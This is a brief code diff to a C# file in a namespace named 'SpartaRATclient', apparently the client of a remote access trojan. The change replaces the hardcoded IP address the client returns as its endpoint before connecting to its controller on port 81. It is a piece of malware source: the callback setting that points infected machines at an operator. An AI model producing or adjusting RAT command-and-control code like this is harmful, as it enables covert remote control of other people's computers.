@@ -38,7 +38,7 @@ namespace SpartaRATclient
                         }
 
                         return new IPEndPoint(IPAddress.Parse(GetIpAddress()), 81);*/
-            return new IPEndPoint(IPAddress.Parse("192.168.1.18"), 81);
+            return new IPEndPoint(IPAddress.Parse("172.0.2.131"), 81);
         }
 
         public void Connect()
